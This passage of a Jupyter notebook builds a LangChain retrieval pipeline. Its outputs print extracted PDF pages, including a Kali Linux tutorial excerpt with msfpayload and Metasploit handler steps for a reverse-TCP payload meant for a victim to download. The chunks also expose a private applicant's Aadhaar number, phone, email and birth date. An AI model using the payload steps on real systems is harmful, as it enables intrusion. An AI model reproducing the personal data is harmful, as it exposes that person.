an open source avail -\\nable freely on the Internet and the tool known is \\nnmap which is responsible a number of inger -\\nprinting, service ingerprinting and numerous \\nTCP scan, stealth scan, UDP scan, PORT scan \\nand many more. \\nFigure 14.  Running Dmitry against Google\\nFigure 17.  TCP scans\\nFigure 16.  Invoking the nmap in the terminal\\nFigure 15.  Results of the Dmitry scan\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 44}, page_content='www.hakin9.org/en 45KALI LINUX – A Solution to HACKINg/SeCURITY\\nStep 1\\nInvoke the nmap by running the command “nmap” \\n(Figure 16).\\nStep 2\\nCheck for TCP SCAN. Command used is: namp \\n-sT IPaddress (Figure 17).\\nexploitation\\nGaining Access or exploitation means to acquire \\nany computer system, control panel of any website \\nor any network without someone’s permission. The \\nattacker in this phase attacks on the systems to \\ngain the access and steals the important informa -\\ntion about the company which he wants to exploit. \\nThe exploit can occur in LAN (Local Area Network), \\nin a WAN (Wide Area Network) and also it can also \\noccur offline like REVERSE ENGINEERING, Buf -\\nfer Overflow Attacks, Password Filtering etc. \\nNow in this particular phase I am going to exploit \\nmy own WIN-7 just to show how the exploitation \\ncan be done through Kali Linux in much faster way \\nthan Backtrack.\\nBefore going deep into the exploitation let me \\nclear some of the basic terminologies so that there \\nshould be no confusion while going through attack -\\ning phase.\\n•  Threat: A threat is potential violation of the se -\\ncurity.\\n•  Vulnerability: It is the weakness in the design of \\nan application or any website that can lead to \\ncompromising with the security of the system or \\nthe network or any web based application.\\n•  Attack: To set up a violence force.\\n•  Exploit: It means to breach the security of the \\nIT (Info. Tech.) System through the vulnerabili -\\nty.\\n•  Payload: Payloads in computer security are re -\\nlated to malicious iles (generally .exe) which \\nperform malicious activity.\\n•  Reverse TCP connection: A reverse connec -\\ntion actually made to bypass the restrictions \\nthat the irewall has applied on the open ports. \\nA irewall actually blocks the incoming trafic \\nthrough the open ports but could not block the \\noutgoing trafic. So, the attacker use this way \\nto bypass the security restrictions.\\nThings Required\\n•  KALI LINUX UPDATED METASPLOIT.\\n•  An intermediate to upload your payload (I am \\nusing DROPBOX and SHARE FOLDER of KA -\\nLI LINUX).Brief Description about the Metasploit\\nMetasploit (also known as MS) is basically an open \\nsource framework that contains all the exploits, \\npayloads, helpful in penetration testing and also \\nhelpful in IDS signature development. MSF actual -\\nly contains the database of the exploit codes which \\nwhen hit on any PC inside or outside the network \\nwith the concerned vulnerabilities, produce a shell \\nat that targeted PC and returns back to the attack -\\ner’s machine.\\nSo, let’s get started with the exploitation phase: \\n•  Open up the terminal and invoke the Metasploit \\nconsole by running the command called \\nmsfconsole  and wait for 1-2 minutes as it takes time \\nto load all the payloads, exploits etc (Figure 18). \\nFigure 20.  Executing the exploit to run\\nFigure 19. Generating a payload for back connection\\nFigure 18. Invoking the Metasploit Terminal\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 45}, page_content='Extra 03/2013 46DeFeNSe\\n•  And in the mean while till the msfconsole gets \\nopened, open up a new terminal to create a \\npayload which will help to create a back con -\\nnection, and in order to create a payload enter \\nthe following command (Figure 19): msfpayload \\nwindows/meterpreter/reverse _ tcp lhost=Kali \\nIP address lport=4444 x > /root/Desktop/\\nbackconnection.exe  \\n•  Now upload it anywhere on the Internet to ex -\\nploit and here I am uploading it in dropbox just \\nfor demonstration.\\n•  Now coming back to the Metasploit console \\nand run the following commands step by step.\\n•  Write the command – use exploit/multi/handler  \\nand press enter” (Figure 20)\\n•  Set a payload by writing the command (Figure \\n21): set payload Windows/vncinject/reverse _ tcp\\n•  Set the LHOST (LOCAL HOST) – set lhost \\n192.168.40.128  (KALI IP address) (Figure 22)\\n•  Then Just set for the exploit – “exploit” (Figure 23)\\n•  Now as soon as The VICTIM download your \\nvulnerable payload ile from the INTERNET \\nyou will get the back connection of his/her PC \\n(Figure 24 and Figure 25)\\nMaintaining Access\\nMaintaining Access is an important phase after \\ngaining the access to any computer system. In \\nthis step the attacker leaves himself an easier way in order to come back to into the system lat -\\ner. By this step of hacking an attacker can come \\nto the gained system anytime even if the service \\nhe exploited is patched. The Metasploit Persis -\\ntent Meterpreter Service is what an attacker usu -\\nally uses, but there’s warning when you use this \\npersistent Meterpreter requires no authentication. \\nBut this will have a problem. Any other attacker \\nwho uses the same service will also have the \\nsame port address to maintain the access which \\nis not a right thing. \\nCovering tracks\\nCovering tracks is a last phase of hacking. Cover -\\ning tracks refers to the actions that are being un -\\ndertaken by an attacker to widen his exploitation of \\nthe system without being detected. Now the rea -\\nson behind covering tracks is to be on the safer \\nside and also include the prolonged stay and con -\\ntinued use of resources. \\nConclusion\\nIn the end I would only like to conclude that in \\nthe depth of crisis, hacking over the INTERNET \\nis still a very big problem. Some hackers do it for \\nthe sake of fun or some do it for the sake of tak -\\ning revenge. Therefore, KALI is the solution of all \\nthese answers. Kali can be used as an OS for \\npenetration testing which could help the security \\nFigure 21.  Executing the payload\\nFigure 24.  Victim tried to install our payload \\nFigure 23.  Setting up the exploit in msfconsole\\nFigure 22.  Setting up the LHOST\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 46}, page_content='KALI LINUX – A Solution to HACKINg/SeCURITY\\nresearchers and analysts to find out the bugs in \\nvarious networks or OS so that they can become \\nsecure to some extent.\\nFigure 25.  Successfully got the Windows Shell on my KALI \\nLINUXDeePANSHU KHANNA\\nLinux Security Researcher, \\nMr. Deepanshu Khanna, a Young Linux Security Expert from \\nLudhiana, Punjab (India), is Linux Security Researcher & Pen -\\netration Tester at “Prediqnous – Cyber Security & IT Intelli -\\ngence”. Currently, he is pursuing his B.Tech. in Computer Sci -\\nence from Lovely Professional University (LPU). He managed \\nWeb Penetration testing, performed network analysis, Exploit \\nmaking, Nessus Complete Security, IDS and Linux Security, \\nwhich leads him to join Prediqnous Team. He has delivered his \\nknowledge through Seminars and Workshops across India. \\nHe gives training to the students for IT Security & Ethical Hack -\\ning. He found and reported many vulnerabilities and phishing \\nscams to IT Dept. of India. He aims to get applauses from oth -\\ner experts of IT industry for his research work on IT Security.\\nEmail: khannadeepanshu34@yahoo.in\\nMobile Number: +91-9779903383\\nadvertisement'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 47}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 48}, page_content='IN SOME CASES\\nnipper studio\\nHAS VIRTUALLY\\nREMOVED\\nMANUAL AUDIT\\nCISCO SYSTEMS INC.theNEED FOR a\\nTitania’s award winning Nipper Studio coniguration \\nauditing tool is helping security consultants and end-\\nuser organizations worldwide improve their network \\nsecurity. Its reports are more detailed than those typically \\nproduced by scanners, enabling you to maintain a higher \\nlevel of vulnerability analysis in the intervals between \\npenetration tests. \\nNow used in over 45 countries, Nipper Studio provides a \\nthorough, fast & cost effective way to securely audit over \\n100 different types of network device. The NSA, FBI, DoD \\n& U.S. Treasury already use it, so why not try it for free at \\nwww.titania.com\\nwww.titania.com\\nUPDA TE\\nNOW WITH\\nSTIG\\nAUDITING'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 49}, page_content='Creating Innovative and Unique QR Code Solutions\\nis our only job and its what we do better than anyone else.\\nIt isn’t about the code, its about what the code can do for you, and \\nit goes so much further than just a marketing idea.  VitreoQR has a \\ncomplete array of world class solutions, from marketing to \\nmanagement, that can help you measure and grow your business. \\nWhatever your challenge might be, inventory control, counterfeit \\nprevention, access control systems, supply chain management or \\nany one of countless other business conditions, VitreoQR can \\ndevelop a QR Code driven solution to meet your speciÞc needs. As \\na licensee of DENSO Wave QR Code patents, we have all the \\nnecessary tools to make your business more efÞcient and more \\nproÞtable through new ideas in 2D barcoding systems.\\nQRCode QRPhoto QRLogo QRMotion QRAnalytics QRCustom SQRC\\nVitreoQR, LLC\\n12801 Berea Road, Suite F\\nCleveland, Ohio 44111 U.S.A.\\nP. 440.941.2320\\nE. info@vitreoqr.com\\nW. http://vitreoqr.comExplore the possibilities that QR Code technologies offer as real world solutions to even the most \\ndifÞcult problems. Convey information, manage issues, reach new markets and move more \\npeople into your perspective as you have never been able to do before. There simply isnÕt \\nanother technology that can do as much for you, at the same value proposition, as a QR Code. \\nVitreoQR deploys genuine, DENSO Wave QR Codes that are absolutely guaranteed to be fully \\ncompliant with the ISO:18004:2006 speciÞcation, delivering to you security and peace of mind.\\nIn Partnership With\\nQR Code® is a Registered Trademark of DENSO WAVE INCORPORATED.No one understands QR Codes like we do. WARNING: If you donÕt want to learn \\nmore, don’t scan this code!\\nINVENTOR OF\\nTHE QR CODE ®®\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/06-5715.pdf', 'page': 0}, page_content='If you’re like most people, you may think of heart \\ndisease as a problem for other folks. If you’re a \\nwoman, you may believe that being female protects you from heart disease. \\nIf you’re a man, you may \\nbelieve you’re not old enough to have a serious heart condition. Wrong on all counts. \\nHeart disease is the #1 killer in the United States—of both men and women. \\nIt affects many people at midlife \\nas well as in old age. African Americans and Latinos are at especially high risk for heart disease and have high rates of some of the risk factors that lead to heart disease. \\nThe good news is that heart disease is preventable. \\nY\\nou can take action to reduce your risk of heart \\ndisease by focusing on your lifestyle and habits. This fact sheet gives you steps you can take to protect your heart health. And what’s good for you, is good for your whole family. As an adult, you can make lifestyle changes that can set a good example for children who may have already developed habits that can lead to heart disease. \\nWhat Is Heart Disease? \\nCoronary heart disease—often simply called heart disease—occurs when the arteries that supply blood to the heart muscle become hardened and narrowed due to a buildup of plaque on the inner walls of the arteries. A heart attack occurs when the plaque in an artery bursts and a clot forms over the plaque, blocking flow through the artery and preventing oxygen and nutrients from getting to the heart. Heart disease is a lifelong condition. Once you get it, you’ll always have it. \\nBut there is much you can do to \\ncontrol the risk factors for heart disease, prevent a heart attack, and increase your chances for a long and vital life. \\nRisk Factors \\nRisk factors are health conditions or habits that increase the chances of developing a disease or having it worsen. For heart disease, there are some risk factors that you can’t change, but many that you can. You can’t change a family history of early heart disease or your age, which for women becomes a risk factor at age 55. Men are at higher risk beginning at age 45. \\nEvery risk factor counts, and if you have more than \\none, they can “gang up” and worsen each other’\\ns \\neffects. But most risk factors can be controlled with changes in lifestyle. Sometimes medication is also needed. Here’s a quick review of these risk factors. \\nSmoking. Smoking leads to reduced blood flow in the \\narteries. \\nThis reduced flow can lead to a heart attack. \\nThere’s no safe way to smoke. However, the benefits of \\nquitting start immediately. After a few days, your blood pressure will drop and the levels of oxygen and carbon monoxide in the blood can return to normal. Just 1 year after quitting, your heart disease risk will drop by more than half. It’s not easy to quit, but make a plan and you can do it. Or try an organized program or medication—ask your doctor if either is right for you. \\nHigh blood pressure. Also called hypertension, high \\nblood pressure increases your risk of heart disease, stroke, and congestive heart failure. \\nEven levels slightly \\nabove normal—called prehypertension—increase your heart disease risk. \\nA Healthy Heart IN BRIEF: \\nYour Guide to \\nU.S. DEPARTMENT OF HEALTH AND HUMAN SERVICES \\nNational Institutes of Health \\nNational Heart, Lung, and Blood Institute \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/06-5715.pdf', 'page': 1}, page_content='There are several ways to get your blood pressure under \\ncontrol. Follow a heart healthy eating plan, r educe \\nyour salt and sodium intake, get regular physical activity, \\nand maintain a healthy weight. If you drink alcoholic \\nbeverages, do so in moderation—one drink per day for \\nwomen and two per day for men. Your doctor may also \\nrecommend medication to lower your blood pressure. \\nHigh blood cholesterol. Excess cholesterol and fat in your \\nblood build up in the walls of the vessels that supply \\nblood to the heart. \\nThis buildup, called plaque, can lead \\nto blockages. A lipoprotein profile tests your levels of \\ntotal cholesterol, low-density lipoprotein (LDL) or “bad” \\ncholesterol, high-density lipoprotein (HDL) or “good” \\ncholesterol, and triglycerides—a fatty substance in the blood. \\nYou can lower your cholesterol by following a heart \\nhealthy eating plan, being physically active, maintaining \\na healthy weight, and, if needed, taking medication. \\nOverweight/obesity. The high rate of overweight and \\nobesity in our country is no secret. \\nBut size isn’t the \\nonly issue. Excess weight can increase the risk of not \\nonly heart disease, but a host of other conditions, such \\nas stroke, gallbladder disease, arthritis, and some can -\\ncers. Even a small amount of weight loss (10 percent of \\nyour initial weight) will help lower your heart disease \\nrisk. \\nIf you are overweight, at the very least, try not to \\ngain more weight. Lasting weight loss requires a change in lifestyle. Adopt \\na healthy\\n, lower calorie eating plan, and be more \\nphysically active. Aim to lose no more than 1/2 pound \\nto 2 pounds per week. If you have a lot of weight to \\nlose, ask your doctor, a registered dietitian, or a \\nqualified nutritionist to help. \\nPhysical inactivity. Even if you have no other risk \\nfactors, being physically inactive greatly boosts your \\nchances of developing heart-related problems. \\nBut \\nnearly 40 percent of Americans do no spare-time \\nphysical activity at all. \\nTry to do at least 30 minutes of moderate-intensity \\nphysical activity on most, if not all, days of the week. \\nThis includes brisk walking, light weightlifting, or even \\nhousecleaning or gardening. \\nIf you need to, divide the 30 \\nminutes into shorter periods of at least 10 minutes each. \\nDiabetes. About 11 million Americans have been \\ndiagnosed with diabetes—and another 5.7 million don’\\nt \\nknow they have it. About two-thirds of those with \\ndiabetes die of heart or blood vessel disease. \\nDiabetes can be detected with a blood sugar test. If you \\nhave diabetes, it is vital that you keep it under control. \\nModest changes in diet and level of physical activity \\ncan often prevent or delay the development of diabetes. \\nTaking Action \\nThe first step to improving your heart health is learning \\nabout your risk profile. See the box “Questions To Ask \\nYour Doctor.” Then begin taking the steps to heart \\nhealth—don’t smoke, follow a heart healthy eating \\nplan, be physically active, and maintain a healthy \\nweight. Start today to keep your heart strong. \\nTo Learn More \\nContact the National Heart, Lung, and Blood Institute \\n(NHLBI) for information and publications on heart \\ndisease and heart health. \\nNHLBI Health Information Center \\nP.O. Box 30105 \\nBethesda, MD 20824-0105 \\nPhone: 301–592–8573 \\nTTY: 240–629–3255 \\nFax: 301–592–8563 \\nwww.nhlbi.nih.gov 1. What is my risk for heart disease? \\n2. What is my blood pressure? What does it mean \\nfor me and what do I need to do about it?\\n \\n3. What are my cholesterol numbers? (These include  \\ntotal cholesterol, LDL, HDL, and triglycerides— \\na type of fat found in the blood and food.) What \\ndo they mean for me and what do I need to do \\nabout them? \\n4. What are my body mass index (BMI) and waist \\nmeasur\\nement? Do they mean that I need to lose \\nweight for my health? \\n5. What is my blood sugar level, and does it mean \\nthat I’m at risk for diabetes?\\n If so, what do \\nI need to do about it? \\n6. What other screening tests do I need to help \\npr\\notect my heart? \\n7. What can you do to help me quit smoking? \\n8. How much physical activity do I need to help \\npr\\notect my heart? \\n9. What’s a heart healthy eating plan for me? \\nHow can I tell if I’m having a heart attack? If I \\nthink I’m having one, what should I do?\\n Questions To Ask \\nYour Doctor \\n10. \\nU.S. DEPARTMENT OF HEALTH AND HUMAN SERVICES \\nNational Institutes of Health \\nNational Heart, Lung, and Blood Institute \\nNIH Publication No. 06–5715 \\n')]"
            ]
          },
          "metadata": {},
          "execution_count": 8
        }
      ],
      "source": [
        "docs"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Z_A2nX3-Ptgl"
      },
      "source": [
        "## Text Splitting - Chunking"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 9,
      "metadata": {
        "id": "Bouw0M5ANVqL"
      },
      "outputs": [],
      "source": [
        "text_splitter = RecursiveCharacterTextSplitter(chunk_size=300, chunk_overlap=50)\n",
        "chunks = text_splitter.split_documents(docs)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 10,
      "metadata": {
        "id": "TfDphk1rrM0A",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "d194ea02-57c3-4579-e970-6c7b961dac9c"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "573"
            ]
          },
          "metadata": {},
          "execution_count": 10
        }
      ],
      "source": [
        "len(chunks)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 11,
      "metadata": {
        "id": "Fsc6K_Z3NnhT",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "699e6f98-07d7-48f1-9e32-0c10a9f38156"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 0}, page_content=\"1.\\nName (As per SSC / Equivalent certificate)\\n:\\nSUNNAM SEETHARAM\\n2.\\nFather's/ Husband's Name\\n:\\nS VEERRAJU\\nPreserve the REGISTRATION NUMBER \\nfor all your future correspondence.\\n3.\\nMother's Name\\n:\\nS SUBHADRA\\n4.\\nGender\\n:\\nMale\\n5.\\nDate of Birth\\n(As per SSC/Equivalent certificate)\\n:\\n16-08-1996\\n4159216\\n6.\")"
            ]
          },
          "metadata": {},
          "execution_count": 11
        }
      ],
      "source": [
        "chunks[0]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 12,
      "metadata": {
        "id": "jenEDd6hN7Cn",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "c476ee0e-8a01-4ba4-a068-83f8753d29de"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 0}, page_content=':\\n16-08-1996\\n4159216\\n6.\\n(a) SSC/Equivalent Roll No.\\n:\\n1111127157\\n(b) Year of Passing\\n:\\n2011\\n11.\\n7.\\nUpload Certificate (SSC or Equivalent)\\n:\\nUploaded\\n8.\\nEducational Qualification\\n:\\nIntermediate  / Any other \\nequivalent\\n9.\\nCommunity\\n:\\nABO-ST\\n10.\\nUpload Community Certificate\\n(For BC, SC and ST)\\n:')"
            ]
          },
          "metadata": {},
          "execution_count": 12
        }
      ],
      "source": [
        "chunks[1]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 13,
      "metadata": {
        "id": "xLh3j6guOTLY",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "764e16ee-3ffb-41e5-b5e8-f64804f08a61"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 0}, page_content='(For BC, SC and ST)\\n:\\nUploaded\\n13.\\nDo you belong to EWS Category ?\\n:\\nNo\\n14.\\nUpload EWS Certificate\\n(For OC)\\n:\\n---\\n15.\\nDo you belong to Ex-Servicemen ?\\n:\\nNo\\nEx-Servicemen Joining Date\\n:\\n---\\nEx-Servicemen Discharge Date / Likely Date \\nof Discharge\\n:\\n---\\n16.\\nldentificaton Marks')"
            ]
          },
          "metadata": {},
          "execution_count": 13
        }
      ],
      "source": [
        "chunks[2]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 14,
      "metadata": {
        "id": "B-lh4cUSO5EH",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "bbc66211-45e1-49b6-e49f-fdb484ef23a9"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 0}, page_content='of Discharge\\n:\\n---\\n16.\\nldentificaton Marks\\n(As per SSC / Equivalent certificate)\\n:\\nA MOLE ON THE LEFT SIDE OF \\nTHE CHEST\\n:\\nA MOLE ON THE RIGHT SIDE OF \\nTHE RIBBS\\n17.\\nMobile No.\\n:\\n8688655324\\n12.\\n18.\\nE-mail id\\n:\\nbtgsuryacomputers@gmail.c\\nom\\n19.\\n(a) Do you have Aadhaar Card ?\\n:\\nYes')"
            ]
          },
          "metadata": {},
          "execution_count": 14
        }
      ],
      "source": [
        "chunks[3]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 15,
      "metadata": {
        "id": "_eZw3iXPPlGs",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "1b86ea64-c9e5-4a34-c153-f623a9e6a25d"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 0}, page_content='om\\n19.\\n(a) Do you have Aadhaar Card ?\\n:\\nYes\\n(b) lf yes, please mention number\\n:\\n673915750575\\n20.\\nWhat is your preferred medium\\nof Examination ?\\n:\\nTelugu\\n21.\\nWhich is your prefered place for \\nwriting Preliminary written test ?\\n(SLPRB, AP reserves the Right to \\ninclude New Test Centres, if')"
            ]
          },
          "metadata": {},
          "execution_count": 15
        }
      ],
      "source": [
        "chunks[4]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 16,
      "metadata": {
        "id": "QcUdFP8cPz1L",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 458,
          "referenced_widgets": [
            "1f034c617d3349a9a03a8616570eaa08",
            "73a5f3ba2c614b1ba5a6364b54733560",
            "4e47c50f05b54c41a4a158d7e50684c4",
            "76607c93072d4a21ae103af71b43d350",
            "ba8499c6e8c44e55ae5e03c6a19e70ec",
            "bdf0a5846a1d48069ccb41e2f90c20dd",
            "20bc18e3ffd94716af3e5ea0ca06443d",
            "e8961204b28947e29ce44941e92b2d58",
            "b8ba0c98c65d4d9d9f3abf467373c5ff",
            "9bc4f2584076448fb4253001b4d8b292",
            "a342f3e0c16b4bd28795d9bcb80c0a1c",
            "7c7303d01d924ab9ba8fa1d43a1303e5",
            "7fd68fd522864c20a8d589ca69c8a616",
            "6edbdba12d3d44c19e12ce909eb7daa5",
            "5e5d0c2c2e18444f84fff3dc66c2d6f9",
            "36beca128bc94908b8a908856ed88a1f",
            "b7e5ac4daf5d40708d3430355d3da8da",
            "ee23a2ec3c3a4142bae90e6447ebba56",
            "64941dc8e25445c2b7653ac8e88aeb08",
            "b896876c5567464198c943e8697c48c9",
            "4c46224e35cb4d8493b9710e555118b4",
            "bac558f35e974dc89c18bbd62be2f7c3",
            "b781d2435e814ac79ea661d3dddeb738",
            "5e2e94778efe43acb1551d2d6c9327e9",
            "c7904bbdeefa484ebcf2987d8af82885",
            "31d6b10cca6041868335aeeb3be76559",
            "dac82008b23f4613afbff98fe0516e2a",
            "430c0df0b1f542f392609cfc93ff265b",
            "1e7e0d5f36d049a7a138130a7207eaf6",
            "ea167b4e5bf941b6b0a13a76b744f119",
            "91f2784ae8e54e54a281f0686e4343e3",
            "6ff3b16153e74b9a874ed97cd95602c3",
            "b07c2e8c36f547319e557598390b947d",
            "a457e0ae59914b36a3e501ad73052e21",
            "99a0796c473143dbb2267b2effac7118",
            "f63db6739ffa4955af34b3c22093d1a5",
            "98b70ec844704832930ee9c26bfaf067",
            "65f32545dc8b4e6d94f2b9f1e42c99d6",
            "adec4a6e7897419f85f9222f2c60c713",
            "5bfe9cbf26e94dc6ab1089d50c0daa27",
            "0ce2501b49bd41b0853ab58cefdf2e6f",
            "1afb9df36afb49ac8b80318c7afc1fca",
            "cab589458dd94467a596ee09136b7df9",
            "ca9317acfc4f44b6959d952c47b2cf95",
            "da7b45e9e462467fb02dcc934aa2c596",
            "2d3e0c1c4dfd4cd3b8c0a1d2b0d3cfc4",
            "b305e96f1cda40ee894a5f6ec8e032c5",
            "e9408461b3224e7c910b0ad7a2359a7e",
            "39a86b401fd247e9b07c5d9066cb5ec9",
            "81885dc1491a4589a68cc3a80bc817f8",
            "7c8abf2ba9a741ef8525da2651996ae1",
            "60b63195037d4c22bb6ef839d8c67e3f",
            "ac2a72ea1dad4b2d83931200f8778792",
            "d8c4e64ac78d4699922bf08ec80b9287",
            "d2d901bd064c4eaab21e3a63163a3e15",
            "9304ecfbd0ad4b4d81a9890b6fa21157",
            "6a766f57968e4581bb5f85ac72f4b2f1",
            "bbe9c78158ec42f2abb2793b6ecce837",
            "58eeaed329324a77b38425d51a2174de",
            "5e97111dee904076a424c8d0580dcca6",
            "3866a036e89843659ee745dfa9d806bb",
            "2df8c0f20c1248d48b1a4379a14b8f26",
            "ff58a340c68c402b97911ae55cd2721b",
            "4355535fd0af4cffb11e843e342bff41",
            "a892d241754d42fb81ff8aa9e32d2f44",
            "1cdf77ca653347a1a842345689f6f09b",
            "0f7b499ababc42f2b90edb031e4c74d8",
            "1d329dab06cb4b7dae285d4892cb7496",
            "59772ad81c364113a55e567b12c8a50a",
            "b6f12f419d7643fdb2f09f7bae287cf0",
            "ef95531bdf1d4e26b579dd1b58adfca0",
            "a8e4a9e81fe145ca9874c816f5d31abf",
            "24c4f608923c475bb517605342faac93",
            "f720f4b4a39b412c9e7823dd5bc9a969",
            "851be56085f846bfa65287014ec84b0d",
            "cb205ba96dcd4d9cb2f9299516f6dd99",
            "0eb0b50eee7e4252ad211471e2c329f9",
            "f2db535c0f0e42cb88a604a993a8b566",
            "5e14fb8d297c43b895530b94bc2ce89a",
            "05873afaa61448e9a1141a04816c33c7",
            "15ac652373134ae086600401618eb25d",
            "155d7eb453384fee98bb6b54db1d3ba7",
            "76d8ef6d9f18423783cc164dfc0f9387",
            "fe4425e812a649c3b3b9ffc9397c8a31",
            "c7a73c28a3294588843bee452b773030",
            "74da5a2accba4e16b432e20bc10c666f",
            "eb011227e2a54edaad33a119c9890c80",
            "e11b7f35cba145c3b900729227f96eeb",
            "bfea642b4adf4027bb05d0e96587183f",
            "2cdcd7d718874e7db997e1fa9176aa2f",
            "bcf689843c0e4306bcba53102ccb5e97",
            "1e61da75e5424fd8a04b40431214c693",
            "87f16f39d3fb4a30805d2e6e72962723",
            "972a7f52edc44f1d819e4e1666ea90c5",
            "b37f4742010f433b9ae6252c92fd0e29",
            "1a430ea553524d17839d43443da1af15",
            "aa3927bda22f4234a172b593f9de44b7",
            "6aca4bd07f1e4c4ab60b242906a6e1ea",
            "19a2d56e9c684917bea1815f71fb5155",
            "f380c6fcadef43e3b2c70f52d231c829",
            "e5ddb51c1e7a42a08c76b1fbc95b4d23",
            "f0f4e602b41c49ce92f11eb335322eec",
            "92cfe53de5fe4f64a55a6a51ad50e583",
            "54f756b5470741d5835a20150bff57d3",
            "054c6320d8104fd5a4de8081937fa3ed",
            "689a1c8f00ec4edab6a8654f2c585028",
            "9ef263034bcf41e9baa1bb1ad01c1c7b",
            "28f3f70a354d4c7e9e8ce5279fd14f39",
            "d61fd5da60534b29b7e99028e424a4dd",
            "6b786f9cd10245e6b75da9597439cae8",
            "3589081a351e403cb5154f2866226b97",
            "6f734724a3e24d9fa0ff6e3a84599017",
            "4e47773d6ac349f2b185aa6dbcbe7023",
            "e7ca5589bd9940718ee1b76164227e82",
            "7a9b6591bf054bd08889fc8ad2c78e3b",
            "da8feb0d2f9243e4a6c6cc4882c631ca",
            "35f5f3e81af24bc88d66dc91a2d65d7b",
            "aba29b09c49647b89b6b1322c9004b2f",
            "6ee45e3313994a81842bcdd903cda872",
            "e0b62255366644d2842ccb89ef7b262f",
            "a6be738ab114450d8dc75c80d1b17b7a"
          ]
        },
        "outputId": "b508b5d9-4555-4856-a8de-5da402155960"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "<ipython-input-16-e470369191f5>:1: LangChainDeprecationWarning: The class `HuggingFaceEmbeddings` was deprecated in LangChain 0.2.2 and will be removed in 1.0. An updated version of the class exists in the langchain-huggingface package and should be used instead. To use it run `pip install -U langchain-huggingface` and import as `from langchain_huggingface import HuggingFaceEmbeddings`.\n",
            "  embeddings = HuggingFaceEmbeddings(model_name=\"BAAI/bge-base-en-v1.5\")\n",
            "/usr/local/lib/python3.10/dist-packages/sentence_transformers/cross_encoder/CrossEncoder.py:13: TqdmExperimentalWarning: Using `tqdm.autonotebook.tqdm` in notebook mode. Use `tqdm.tqdm` instead to force console mode (e.g. in jupyter console)\n",
            "  from tqdm.autonotebook import tqdm, trange\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "modules.json:   0%|          | 0.00/349 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "1f034c617d3349a9a03a8616570eaa08"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "config_sentence_transformers.json:   0%|          | 0.00/124 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "7c7303d01d924ab9ba8fa1d43a1303e5"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "README.md:   0%|          | 0.00/94.6k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "b781d2435e814ac79ea661d3dddeb738"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "sentence_bert_config.json:   0%|          | 0.00/52.0 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "a457e0ae59914b36a3e501ad73052e21"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "config.json:   0%|          | 0.00/777 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "da7b45e9e462467fb02dcc934aa2c596"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "model.safetensors:   0%|          | 0.00/438M [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
